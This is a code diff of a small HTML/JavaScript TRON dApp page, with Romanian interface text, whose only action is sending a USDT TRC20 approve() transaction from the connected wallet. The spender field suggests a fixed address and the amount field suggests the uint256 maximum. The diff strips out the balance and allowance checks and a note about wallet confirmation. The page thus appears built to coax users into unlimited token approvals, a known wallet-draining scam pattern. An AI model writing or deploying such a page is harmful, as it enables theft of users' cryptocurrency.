@@ -11,7 +11,7 @@ body{font-family:system-ui;margin:20px;background:#f7f9fc}
 input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
 button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
 .secondary{background:#e5e7eb;color:#111}
-pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
+pre{background:#f3f4f6;padding:10px;border-radius:8px}
 .status{padding:6px 10px;border-radius:999px;background:#fee2e2;display:inline-block}
 .ok{background:#d1fae5}
 </style>
@@ -20,7 +20,7 @@ pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
 <body>
 
 <div class="card">
-<h2>TRON PRO dApp (Production Safe)</h2>
+<h2>TRON PRO dApp</h2>
 <div id="status" class="status">Deconectat</div>
 <p>Wallet: <b id="addr">—</b></p>
 <button onclick="connect()">Connect Wallet</button>
@@ -29,12 +29,9 @@ pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
 <div class="card">
 <h3>TRC20 Settings</h3>
 
-<input id="token" value="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t" placeholder="Token (USDT TRC20)"/>
 <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
 <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
 
-<button onclick="checkBalance()" class="secondary">Check USDT Balance</button>
-<button onclick="checkAllowance()" class="secondary">Check Allowance</button>
 <button onclick="approve()">Approve</button>
 
 <pre id="out"></pre>
@@ -44,107 +41,62 @@ pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
 const USDT="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
 let addr=null;
 
-function getTron(){
-return window.tronWeb;
-}
-
 function connect(){
-if(!getTron() || !getTron().defaultAddress.base58){
-alert("Deschide în Trust Wallet sau TronLink dApp browser");
-return;
-}
-addr=getTron().defaultAddress.base58;
-document.getElementById("addr").innerText=addr;
-document.getElementById("status").innerText="Conectat";
-document.getElementById("status").classList.add("ok");
-}
-
-async function getContract(token){
-return await getTron().contract().at(token);
+  if(!window.tronWeb || !window.tronWeb.defaultAddress.base58){
+    alert("Deschide în Trust Wallet / TronLink dApp browser");
+    return;
+  }
+  addr = window.tronWeb.defaultAddress.base58;
+  document.getElementById("addr").innerText = addr;
+  document.getElementById("status").innerText = "Conectat";
+  document.getElementById("status").classList.add("ok");
 }
 
-async function checkBalance(){
-try{
-const c=await getContract(USDT);
-const res=await c.balanceOf(addr).call();
-document.getElementById("out").innerText="USDT Balance: "+(res.toString()/1e6);
-}catch(e){
-document.getElementById("out").innerText="Eroare balance";
-}
+async function getContract(){
+  return await window.tronWeb.contract().at(USDT);
 }
 
-async function checkAllowance(){
-try{
-const spender=document.getElementById("spender").value;
-const c=await getContract(USDT);
-const res=await c.allowance(addr,spender).call();
-document.getElementById("out").innerText="Allowance: "+res.toString();
-}catch(e){
-document.getElementById("out").innerText="Eroare allowance";
+function toUnits(amount){
+  amount = amount.replace(",", ".").trim();
+
+  // max support
+  if(amount.toLowerCase() === "max"){
+    return (BigInt(1) << BigInt(256)) - BigInt(1);
+  }
+
+  if(/^[0-9]+$/.test(amount)){
+    return BigInt(amount) * 1000000n;
+  }
+
+  const parts = amount.split(".");
+  const intPart = parts[0] || "0";
+  const frac = (parts[1] || "").padEnd(6, "0").slice(0,6);
+
+  return BigInt(intPart + frac);
 }
-}
+
 async function approve(){
   try{
     const spender = document.getElementById("spender").value;
-    let amount = document.getElementById("amount").value;
+    const amount = document.getElementById("amount").value;
 
     if(!spender || !amount){
       document.getElementById("out").innerText="Completează câmpurile";
       return;
     }
 
-    // tratează "max" (uint256 max)
-    const UINT256_MAX = (BigInt(1) << BigInt(256)) - BigInt(1);
+    const value = toUnits(amount);
 
-    // USDT are 6 zecimale
-    const DECIMALS = 6n;
-
-    // funcție helper: parsează string decimal în smallest units ca BigInt
-    function parseDecimalToUnits(s){
-      // dacă este deja un întreg în smallest units (doar cifre), returnează direct
-      if(/^[0-9]+$/.test(s)) return BigInt(s);
-
-      // formă decimală: "123.456"
-      const parts = s.split('.');
-      const intPart = parts[0] === '' ? '0' : parts[0];
-      const fracPart = (parts[1] || '').slice(0, Number(DECIMALS)); // taie la DECIMALS
-      const fracPadded = fracPart.padEnd(Number(DECIMALS), '0'); // completează cu 0
-      const combined = intPart + fracPadded;
-      // elimină eventuale zerouri la început
-      const normalized = combined.replace(/^0+(?=\d)|^$/, '0');
-      return BigInt(normalized);
-    }
-
-    let value;
-    if(typeof amount === 'string' && amount.toLowerCase() === 'max'){
-      value = UINT256_MAX;
-    } else {
-      // dacă user a introdus un număr mare în unități minime (fără punct), îl acceptăm
-      // altfel tratăm ca valoare cu zecimale USDT
-      // detectăm prezența punctului sau virgulei
-      amount = amount.replace(',', '.').trim();
-      if(/^[0-9]+$/.test(amount)){
-        // valoare numerică fără zecimale -> interpretăm ca units (smallest) sau ca USDT whole?
-        // Vom interpreta ca unități minime dacă lungimea e > 18 (sau dacă user vrea explicit).
-        // Pentru siguranță, interpretăm simplu: tratăm ca USDT whole (adăugăm 6 zecimale).
-        value = BigInt(amount) * (BigInt(10) ** DECIMALS);
-      } else {
-        // formă decimală => parsează în smallest units
-        value = parseDecimalToUnits(amount);
-      }
-    }
-
-    const c = await getContract(USDT);
-
-    // IMPORTANT: user MUST confirm in wallet
+    const c = await getContract();
     const tx = await c.approve(spender, value.toString()).send();
 
     document.getElementById("out").innerText =
       "Approve sent!\nTX: " + tx;
+
   }catch(e){
-    document.getElementById("out").innerText="Eroare approve / user rejected";
+    document.getElementById("out").innerText =
+      "Eroare approve / user rejected";
   }
-}
 }
 </script>
 
